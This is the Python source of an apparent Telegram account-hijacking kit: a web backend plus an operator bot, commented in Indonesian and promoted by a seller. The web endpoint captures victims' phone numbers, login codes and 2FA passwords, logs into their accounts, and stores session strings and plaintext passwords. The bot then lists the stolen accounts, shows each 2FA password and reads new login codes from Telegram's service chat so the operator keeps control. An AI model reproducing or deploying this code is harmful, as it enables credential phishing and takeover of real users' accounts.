from quart import Quart, request, jsonify
from quart_cors import cors
# Standard library imports
import asyncio
import logging
import os
import re
import sys
import pytz
from datetime import datetime
from dotenv import load_dotenv
import asyncpg
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.messages import GetHistoryRequest, GetHistoryRequest
from telethon.tl.functions.contacts import GetContactsRequest, DeleteContactsRequest
from telethon.errors import (
    PhoneNumberBannedError,
    SessionPasswordNeededError,
    AuthKeyError,
)

# Load environment variables and configure logging
load_dotenv()
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('telegram_bot.log')
    ]
)
logger = logging.getLogger(__name__)

# Initialize Quart app
app = Quart(__name__)
app = cors(app, allow_origin="*")
app.config.setdefault("PROVIDE_AUTOMATIC_OPTIONS", True)
app.secret_key = os.getenv("SECRET_KEY", "28889409bf0332d9c82ff1c4fff5b69fce38197d")

# Load environment variables
USER_ID = int(os.getenv("USER_ID"))
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
DATABASE_URL = os.getenv("DATABASE_URL")
device_model = os.getenv("DEVICE_MODEL", "1.0")
system_version = os.getenv("SYSTEM_VERSION", "iPhone")
app_version = os.getenv("APP_VERSION", "1.0")
lang_code = os.getenv("LANG_CODE", "en")
system_lang_code = os.getenv("SYSTEM_LANG_CODE", "en")
timezone = os.getenv("TIMEZONE", "Asia/Jakarta")

datetime.now(pytz.timezone(timezone)).strftime('%Y-%m-%d %H:%M:%S')

if DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)

# Status fitur (aktif atau nonaktif)
def str_to_bool(value):
    return value.lower() in ('true', '1', 'yes') if value else False

# Membaca status fitur dari .env dan mengonversinya ke boolean
FEATURE_STATUS = {
    "sedot": str_to_bool(os.getenv("FITUR_SEDOT", "false")),
    "sebar": str_to_bool(os.getenv("FITUR_SEBAR", "false")),
}

db_pool = None

async def get_db_pool():
    global db_pool
    if db_pool is None:
        try:
            db_pool = await asyncpg.create_pool(DATABASE_URL, min_size=1, max_size=10)
            logger.info("Database pool created successfully")
        except asyncpg.PoolAcquireTimeoutError as e:
            logger.critical(f"Timeout error creating database pool: {str(e)}")
            sys.exit(1)
        except Exception as e:
            logger.critical(f"Error creating database pool: {str(e)}")
            sys.exit(1)
    return db_pool

async def execute_db_operation(operation, *args):
    pool = await get_db_pool()
    async with pool.acquire() as connection:
        try:
            if isinstance(operation, str):
                return await connection.execute(operation, *args)
            else:
                return await operation(connection, *args)
        except asyncpg.PostgresError as e:
            logger.error(f"Database error: {str(e)}")
            return None
        except Exception as e:
            logger.error(f"Unexpected error: {str(e)}")
            return None


async def create_accounts_table():
    pool = await get_db_pool()
    async with pool.acquire() as connection:
        try:
            # Membuat tabel jika belum ada
            await connection.execute('''
                CREATE TABLE IF NOT EXISTS accounts (
                    phone VARCHAR PRIMARY KEY, 
                    username VARCHAR,
                    password VARCHAR,
                    session_data TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')

            # Membuat indeks pada kolom username jika belum ada
            await connection.execute('''
                CREATE INDEX IF NOT EXISTS accounts_username_idx ON accounts (username);
            ''')

            logger.info("Tabel 'accounts' berhasil dibuat atau sudah ada.")
        except Exception as e:
            logger.error(f"Error creating accounts table: {str(e)}")

async def save_account_to_db(phone, username=None, password=None, session_data=None):
    if isinstance(session_data, bytes):
        session_data = session_data.decode('utf-8')
    logger.debug(f"Saving account: phone={phone}, username={username}")
    await execute_db_operation('''
        INSERT INTO accounts (phone, username, password, session_data)
        VALUES ($1, $2, $3, $4)
        ON CONFLICT (phone) DO UPDATE
        SET username = EXCLUDED.username, 
            password = EXCLUDED.password, 
            session_data = EXCLUDED.session_data
    ''', phone, username, password, session_data)
    logger.info(f"Account {phone} berhasil disimpan di database.")

async def load_accounts_from_db():
    return await execute_db_operation(lambda conn: conn.fetch('SELECT phone, username, password, session_data FROM accounts ORDER BY created_at DESC'))

async def delete_account_from_db(phone):
    await execute_db_operation('DELETE FROM accounts WHERE phone = $1', phone)
    logger.info(f"Account {phone} berhasil dihapus dari database.")

# Tambahkan fungsi helper ini setelah definisi variabel
async def create_telegram_client(session_data):
    return TelegramClient(
        StringSession(session_data),
        API_ID,
        API_HASH,
        device_model=device_model,
        system_version=system_version,
        app_version=app_version,
        lang_code=lang_code,
        system_lang_code=system_lang_code,
        connection_retries=None,
        auto_reconnect=False,
        sequential_updates=True
    )

@app.before_serving
async def startup():
    global db_pool
    try:
        db_pool = await get_db_pool()
        await create_accounts_table()  # Membuat tabel jika belum ada
        logger.info("Application startup complete")
    except Exception as e:
        logger.critical(f"Error during startup: {str(e)}")
        sys.exit(1)

@app.after_serving
async def shutdown():
    global db_pool
    try:
        if db_pool:
            await db_pool.close()
            logger.info("Database pool closed")
        logger.info("Application shutdown complete")
    except Exception as e:
        logger.error(f"Error during shutdown: {str(e)}")


@app.route('/', methods=['GET', 'POST'])
async def index():
    bot = Bot(token=BOT_TOKEN)
    
    if request.method == 'POST':
        form = await request.form
        
        # Pengiriman kode verifikasi
        if 'phone' in form:
            phone = form['phone']
            client = await create_telegram_client('')
            try:
                await client.connect()
                if not await client.is_user_authorized():
                    try:
                        result = await client.send_code_request(
                            phone,
                            force_sms=False
                        )
                        session_data = client.session.save()
                        logger.debug(f"String sesi: {session_data}")
                        logger.debug(f"Kode pengiriman ke {phone}: {result.phone_code_hash}")
                        
                        # Mengirimkan hasil sebagai respons
                        return jsonify({
                            "status": "success", 
                            "phone": phone, 
                            "phone_code_hash": result.phone_code_hash, 
                            "session_data": session_data
                        })
                    except PhoneNumberBannedError:
                        return jsonify({"status": "error", "message": "Phone Number is Banned"})
                    except Exception as e:
                        logger.error(f"Kesalahan tidak terduga: {str(e)}")
                        return jsonify({"status": "error", "message": "Phone Number Invalid"})
                else:
                    return jsonify({"status": "error", "message": "Nomor telepon sudah terdaftar."})
            finally:
                await client.disconnect()
        
        # Verifikasi kode OTP yang diterima
        elif 'code' in form:
            phone = form.get('phone_number')
            phone_code_hash = form.get('phone_code_hash')
            code = form['code']
            session_data = form.get('session_data')
            client = await create_telegram_client(session_data)
            try:
                await client.connect()
                logger.debug(f"Mencoba untuk login dengan kode: {code} dan hash: {phone_code_hash}")
                await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
                me = await client.get_me()
                username = me.username
                session_data = client.session.save()
                logger.debug(f"String sesi: {session_data}")

                # Simpan akun ke database atau lakukan proses lebih lanjut
                await save_account_to_db(phone, username, None, session_data)
                await bot.send_message(chat_id=USER_ID, text=f"- 📣 LOGIN BERHASIL -\n@{username} | {phone}")
                return jsonify({"status": "success"})
            except SessionPasswordNeededError:
                return jsonify({
                    "status": "needed_password", 
                    "phone": phone, 
                    "phone_code_hash": phone_code_hash, 
                    "session_data": session_data
                })
            except Exception as e:
                logger.error(f"Error saat login dengan kode: {str(e)}")
                return jsonify({"status": "error", "message": "Code Invalid"})
            finally:
                await client.disconnect()
        
        # Verifikasi password jika diminta
        elif 'password' in form:
            phone = form.get('phone_number')
            password = form['password']
            session_data = form.get('session_data')
            client = await create_telegram_client(session_data)
            try:
                await client.connect()
                await client.sign_in(password=password)
                me = await client.get_me()
                username = me.username
                session_data = client.session.save()
                logger.debug(f"String sesi: {session_data}")

                # Simpan akun ke database atau lakukan proses lebih lanjut
                await save_account_to_db(phone, username, password, session_data)
                await bot.send_message(chat_id=USER_ID, text=f"- 📣 LOGIN BERHASIL -\n@{username} | {phone}")
                return jsonify({"status": "success"})
            except Exception as e:
                logger.error(f"Error saat login dengan password: {str(e)}")
                return jsonify({"status": "error", "message": "Password Invalid."})
            finally:
                await client.disconnect()
    
    # Respons JSON untuk metode GET
    return jsonify({"status": "ready"})


# Telegram Bot Functions

# Define other functions and handlers here...


async def validate_user(update: Update) -> bool:
    try:
        user_id = update.effective_user.id
        if user_id != USER_ID:
            await update.message.reply_text("Anda tidak memiliki izin untuk mengakses bot ini.\n\n<b>Author ⬇️</b>\n<i>Telegram : https://t.me/webcuan</i>\n<i>WhatsApp : https://wa.me/628123456789</i>", parse_mode='html')
            logger.warning(f"User ID {user_id} mencoba mengakses bot tanpa izin.")
            return False
        return True
    except Exception as e:
        logger.error(f"Error in validate_user: {str(e)}", exc_info=True)
        return False

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE, page: int = 0) -> None:
    if not await validate_user(update):
        return

    try:
        accounts = await load_accounts_from_db()
        logger.info(f"Loaded {len(accounts)} accounts from database for display.")

        accounts_per_page = 10
        start_idx = page * accounts_per_page
        end_idx = start_idx + accounts_per_page
        total_pages = (len(accounts) + accounts_per_page - 1) // accounts_per_page

        keyboard = []
        for i, account in enumerate(accounts[start_idx:end_idx], start=start_idx + 1):
            phone = account["phone"]
            button_text = f"{i}. {phone}"
            keyboard.append(
                [InlineKeyboardButton(button_text, callback_data=f"session_{i - 1}")]
            )

        nav_buttons = []
        if page > 0:
            nav_buttons.append(
                InlineKeyboardButton("⬅️ Back", callback_data=f"page_{page - 1}")
            )
        if page < total_pages - 1:
            nav_buttons.append(
                InlineKeyboardButton("Next ➡️", callback_data=f"page_{page + 1}")
            )

        if nav_buttons:
            keyboard.append(nav_buttons)

        keyboard.append(
            [InlineKeyboardButton("🔄 Filter Akun Expired", callback_data="filter_banned")]
        )

        text = (
            f"<b>[𝑽.7]-.Telegram Account Manager.-</b>\n\n"
            f"<b>Total Akun {len(accounts)}</b> | "
            f"<b>Akun {start_idx + 1}/{min(end_idx, len(accounts))} - Page {page + 1}/{total_pages}</b>\n\n"
        )

        reply_markup = InlineKeyboardMarkup(keyboard)
        if update.callback_query:
            await update.callback_query.edit_message_text(
                text=text, reply_markup=reply_markup, parse_mode="html"
            )
        else:
            await update.message.reply_text(
                text=text, reply_markup=reply_markup, parse_mode="html"
            )
    except Exception as e:
        logger.error(f"Error in start command: {str(e)}", exc_info=True)
        await update.message.reply_text("Terjadi kesalahan saat memuat akun.")


# Callback untuk menangani session dan callback dari list akun yg dipilih
async def session_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await validate_user(update):
        return

    query = update.callback_query
    logger.info(f"Callback data diterima: {query.data}")

    if query.data == "exit_menu":
        page = 0
        try:
            await start(update, context, page)
        except Exception as e:
            logger.error(f"Error saat menghapus pesan: {e}")
        return

    try:
        session_index = int(query.data.split("_")[1])
        logger.info(f"User memilih sesi dengan index {session_index}")
    except (IndexError, ValueError) as e:
        logger.error(f"Invalid session index: {str(e)}")
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="Indeks sesi tidak valid."
        )
        return

    try:
        accounts = await load_accounts_from_db()
        if session_index >= len(accounts):
            logger.warning("Session index out of range.")
            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text="Akun tidak ditemukan."
            )
            return

        account = accounts[session_index]
        phone = account["phone"]
        password = account.get("password", "Nonaktif")
        session_data = account.get("session_data")

        if not session_data:
            logger.error("Session data tidak ditemukan untuk akun ini.")
            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text="Session data tidak valid. Silakan periksa kembali."
            )
            return

        client = await create_telegram_client(session_data)
        await client.disconnect()
        await client.connect()

        if not await client.is_user_authorized():
            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text="Akun tidak terotorisasi, sesi dihapus."
            )
            await delete_account_from_db(phone)
            return

        me = await client.get_me()
        first_name = me.first_name
        last_name = me.last_name if me.last_name else ""
        full_name = f"{first_name} {last_name}".strip()
        username = me.username or "-"
        id_akun = me.id
        nama_akun = me.first_name or "-"

        result = await client(GetContactsRequest(hash=0))
        contacts = [contact for contact in result.users if not contact.bot and not contact.deleted]

        mutual_contacts_list = [contact for contact in contacts if contact.mutual_contact]
        non_mutual_contacts_list = [contact for contact in contacts if not contact.mutual_contact]

        mutual_contacts = len(mutual_contacts_list)
        non_mutual_contacts = len(non_mutual_contacts_list)
        total_contacts = mutual_contacts + non_mutual_contacts

        message_text = (
            f"<b>[𝑽.7]-.Telegram Account Selected.-̲</b>\n\n"
            f"<b> • Nama :</b> <b>{full_name}</b>\n"
            f"<b> • Nomor :</b> <code>{phone}</code>\n"
            f"<b> • 2FA :</b> <code>{password}</code>\n" 
            f"<b> • Kontak :</b> {total_contacts}\n"
            f"<b> ├─ Mutual :</b> {mutual_contacts}\n"
            f"<b> └─ Non Mutual :</b> {non_mutual_contacts}\n\n"
            f"<b>Pilih fungsi akun di bawah ini:</b>"
        )

        keyboard = [
            [
                InlineKeyboardButton("📲 CEK OTP", callback_data=f"get_otp_{session_index}"),
                InlineKeyboardButton("❌ HAPUS", callback_data=f"logout_{session_index}")
            ],
            [InlineKeyboardButton("⏪ Back to List Account", callback_data="exit_menu")]
        ]

        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode='html'
        )

    except Exception as e:
        logger.error(f"Error in session_callback: {str(e)}", exc_info=True)
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="Terjadi kesalahan saat memilih sesi."
        )
    finally:
        if 'client' in locals() and client.is_connected():
            await client.disconnect()

     
async def handle_pagination(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()  # Menghilangkan loading indikator pada Telegram

    # Mendapatkan nomor halaman dari callback data
    page = int(query.data.split("_")[1])

    # Panggil kembali fungsi `start` dengan halaman yang dipilih
    await start(update, context, page=page)


# Callback GET OTP
async def get_latest_otp(account, password=None):
    session_data = account.get("session_data")
    client = await create_telegram_client(session_data)
    try:
        await client.connect()
        if password:
            await client.sign_in(password=password)
        telegram_entity = await client.get_entity(777000)  # ID Telegram untuk OTP
        messages = await client(
            GetHistoryRequest(
                peer=telegram_entity,
                limit=10,
                offset_date=None,
                offset_id=0,
                max_id=0,
                min_id=0,
                add_offset=0,
                hash=0,
            )
        )

        for message in messages.messages:
            if any(
                keyword in message.message
                for keyword in ["Kode", "code", "kode", "Code", "kod", "Kod"]
            ):
                match = re.search(r"(\d{5,6})", message.message)
                if match:
                    return match.group(1)
        return None
    except SessionPasswordNeededError:
        return "password_needed"
    except AuthKeyError:
        logger.error(
            f"Sesi kadaluarsa untuk akun: {account['phone']}. Menghapus dari database."
        )
        await delete_account_from_db(account["phone"])
        return "unauthorized"
    except Exception as e:
        logger.error(f"Error saat login: {str(e)}")
        return None
    finally:
        await client.disconnect()


async def get_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await validate_user(update):
        return

    query = update.callback_query
    await query.answer()

    try:
        session_index = int(query.data.split("_")[2])
        logger.info(f"User meminta OTP untuk session index {session_index}")
    except (IndexError, ValueError) as e:
        logger.error(f"Invalid OTP session index: {str(e)}")
        await context.bot.send_message(
            chat_id=query.message.chat_id, text="Indeks sesi tidak valid."
        )
        return

    try:
        accounts = await load_accounts_from_db()
        if session_index < len(accounts):
            account = accounts[session_index]
            code = await get_latest_otp(account)

            if code:
                await context.bot.send_message(
                    chat_id=query.message.chat_id,
                    text=f"Kode Login dari akun {account['phone']} : <code>{code}</code>",
                    parse_mode='html'
                )
            else:
                await context.bot.send_message(
                    chat_id=query.message.chat_id,
                    text=f"Tidak ada Kode Login dari akun {account['phone']}",
                    parse_mode='html'
                )
        else:
            logger.warning("Session index out of range.")
            await context.bot.send_message(
                chat_id=query.message.chat_id, text="Akun tidak ditemukan."
            )
    except Exception as e:
        logger.error(f"Error in get_otp_callback: {str(e)}", exc_info=True)
        await context.bot.send_message(
            chat_id=query.message.chat_id, text="Terjadi kesalahan saat mengambil OTP."
        )

# Callback LOGOUT ( Hapus sesi )
async def logout_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await validate_user(update):
        return

    query = update.callback_query
    await query.answer()

    try:
        session_index = int(query.data.split("_")[1])

        keyboard = [
            [
                InlineKeyboardButton(
                    "Ya", callback_data=f"confirm_logout_{session_index}"
                ),
                InlineKeyboardButton("Tidak", callback_data="cancel_logout"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.message.reply_text(
            "Apakah Anda yakin ingin menghapus akun ini?", reply_markup=reply_markup
        )
    except Exception as e:
        logger.error(f"Error in logout_callback: {str(e)}", exc_info=True)
        await context.bot.send_message(
            chat_id=query.message.chat_id, text=f"Terjadi kesalahan: {str(e)}"
        )

async def confirm_logout_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await validate_user(update):
        return

    query = update.callback_query
    await query.answer()

    try:
        session_index = int(query.data.split("_")[2])
        accounts = await load_accounts_from_db()

        if session_index >= len(accounts):
            await query.message.reply_text("Akun tidak ditemukan.")
            return

        account = accounts[session_index]
        await delete_account_from_db(account["phone"])
        await query.message.reply_text(f"Akun @{account['username']} berhasil dihapus.")
        await start(update, context)
    except Exception as e:
        logger.error(f"Error in confirm_logout_callback: {str(e)}", exc_info=True)
        await query.message.reply_text("Terjadi kesalahan saat menghapus akun.")

async def cancel_logout_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    try:
        await query.message.delete()
    except Exception as e:
        logger.error(f"Error in cancel_logout_callback: {str(e)}", exc_info=True)
        await query.message.reply_text("Terjadi kesalahan saat membatalkan penghapusan.")


async def filter_banned_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await validate_user(update):
        return

    query = update.callback_query
    await query.answer("Memulai pemeriksaan akun...")

    try:
        accounts = await load_accounts_from_db()
        if not accounts:
            await query.message.edit_text("Tidak ada akun yang tersedia untuk diperiksa.")
            return

        status_message = await query.message.edit_text(
            "🔄 Memeriksa status akun...\n"
            "Mohon tunggu sebentar."
        )

        banned_accs = []
        total = len(accounts)

        for i, account in enumerate(accounts, 1):
            try:
                session_data = account.get("session_data")
                client = await create_telegram_client(session_data)
                await client.disconnect()
                await client.connect()

                await status_message.edit_text(
                    f"🔄 Memeriksa akun... ({i}/{total})\n"
                    f"Nomor: {account['phone']}"
                )

                if not await client.is_user_authorized():
                    banned_accs.append(account["phone"])
                    logger.info(f"Akun tidak terotorisasi: {account['phone']}")

                await client.disconnect()

            except Exception as e:
                banned_accs.append(account["phone"])
                logger.error(f"Error checking account {account['phone']}: {str(e)}")

        for phone in banned_accs:
            await delete_account_from_db(phone)

        if banned_accs:
            result_text = (
                f"✅ Pemeriksaan selesai!\n\n"
                f"📛 {len(banned_accs)} akun telah dihapus:\n"
                + "\n".join([f"• {phone}" for phone in banned_accs])
            )
        else:
            result_text = "✅ Pemeriksaan selesai!\n\nℹ️ Tidak ada akun yang perlu dihapus."

        keyboard = [[InlineKeyboardButton("⬅️ Kembali", callback_data="exit_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await status_message.edit_text(
            result_text,
            reply_markup=reply_markup
        )

    except Exception as e:
        logger.error(f"Error in filter_banned_callback: {str(e)}")
        await query.message.edit_text(
            f"❌ Terjadi kesalahan saat memeriksa akun:\n{str(e)}"
        )

async def filter_banned_accounts():
    accounts = await load_accounts_from_db()
    banned_accs = []
    for account in accounts:
        phone = account["phone"]
        session_data = account["session_data"]
        client = await create_telegram_client(session_data)
        await client.disconnect()
        await client.connect()
        if not await client.is_user_authorized():
            try:
                await client.send_code_request(phone)
            except PhoneNumberBannedError:
                banned_accs.append(account)
        await client.disconnect()

    for acc in banned_accs:
        await delete_account_from_db(acc["phone"])
    return banned_accs


async def cleanup_sessions():
    while True:
        try:
            await asyncio.sleep(3600)  # Run every hour
            accounts = await load_accounts_from_db()
            for account in accounts:
                session_data = account.get("session_data")
                client = await create_telegram_client(session_data)
                try:
                    await client.disconnect()
                    await client.connect()
                    if not await client.is_user_authorized():
                        await delete_account_from_db(account["phone"])
                        logger.info(
                            f"Cleaned up unauthorized session for {account['phone']}"
                        )
                except Exception as e:
                    logger.error(f"Error checking session {account['phone']}: {str(e)}")
                finally:
                    await client.disconnect()
        except Exception as e:
            logger.error(f"Error in cleanup_sessions: {str(e)}")


async def update_progress(message, current, total, operation=""):
    progress = (current / total) * 100
    await message.edit_text(
        f"{operation} Progress: {current}/{total} ({progress:.1f}%)"
    )


def sanitize_input(text):
    return re.sub(r"[^\w\s-]", "", text)

async def disabled_feature_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer("FITUR NONAKTIF!", show_alert=True)
    try:
        await query.message.reply_text(
            (
                "🚫 <b>Fitur saat ini tidak aktif.</b>\n\n"
                "🔹 Jika ingin menambah Fitur, silakan hubungi :\n"
                "<i>Telegram: <a href='https://t.me/webcuan'>@webcuan</a></i>\n"
                "<i>WhatsApp: <a href='https://wa.me/628123456789'><b>WC | Web Store</b></a></i>"
            ),
            parse_mode="html",
            disable_web_page_preview=True)
    except Exception as e:
        logger.error(f"Error in disabled_feature_callback: {str(e)}", exc_info=True)
        await query.message.reply_text("Terjadi kesalahan saat memproses permintaan.")
        
async def send_startup_message(bot):
    try:
        welcome_message = (
            "🎉 <b>Welcome to WC Botz | True Login!</b> 🎉\n\n"
            "🔔 <b>BOT Telah di Update , Info Update:</b>\n"
            "1. Menambah filter last seen di fungsi sedot.\n"
            "2. Memperbaiki masalah stuck/error/bug.\n\n"
            "Terima kasih telah menggunakan bot ini! 😊\n\n"
            "<b><i>Author ⬇️</i></b>\n"
            "<i>Telegram : https://t.me/webcuan</i>\n"
            "<i>WhatsApp : https://wa.me/628123456789</i>"
        )
        await bot.send_message(chat_id=USER_ID, text=welcome_message, parse_mode='html')
        logger.info("Startup message sent successfully.")
    except Exception as e:
        logger.error(f"Failed to send startup message: {str(e)}")


async def run_bot():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(session_callback, pattern=r"^session_\d+$"))
    application.add_handler(CallbackQueryHandler(get_otp_callback, pattern=r"^get_otp_\d+$"))
    application.add_handler(CallbackQueryHandler(logout_callback, pattern=r"^logout_\d+$"))
    application.add_handler(CallbackQueryHandler(handle_pagination, pattern=r"^page_\d+$"))
    application.add_handler(CallbackQueryHandler(filter_banned_callback, pattern="^filter_banned$"))

    application.add_handler(CallbackQueryHandler(disabled_feature_callback, pattern="^disabled_"))
    application.add_handler(CallbackQueryHandler(session_callback, pattern="^exit_menu$"))


    application.add_handler(CallbackQueryHandler(confirm_logout_callback, pattern=r"^confirm_logout_\d+$"))
    application.add_handler(CallbackQueryHandler(cancel_logout_callback, pattern=r"^cancel_logout$"))

    await application.initialize()
    await application.start()
    await application.updater.start_polling()

    logger.info(f"Bot connected as @{application.bot.username}")

    # Send startup message
    # await send_startup_message(application.bot)
    
    return application

async def run_web():
    await app.run_task(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))

async def main():
    try:
        logger.info("Starting the application...")
        await get_db_pool()

        bot_task = asyncio.create_task(run_bot())
        web_task = asyncio.create_task(run_web())
        cleanup_task = asyncio.create_task(cleanup_sessions())

        await asyncio.gather(web_task, bot_task, cleanup_task)
    except KeyboardInterrupt:
        logger.info("Received interrupt. Stopping the application...")
    except Exception as e:
        logger.error(f"Application encountered an error: {str(e)}")
    finally:
        await shutdown()
        logger.info("Application has been stopped.")

if __name__ == "__main__":
    asyncio.run(main())

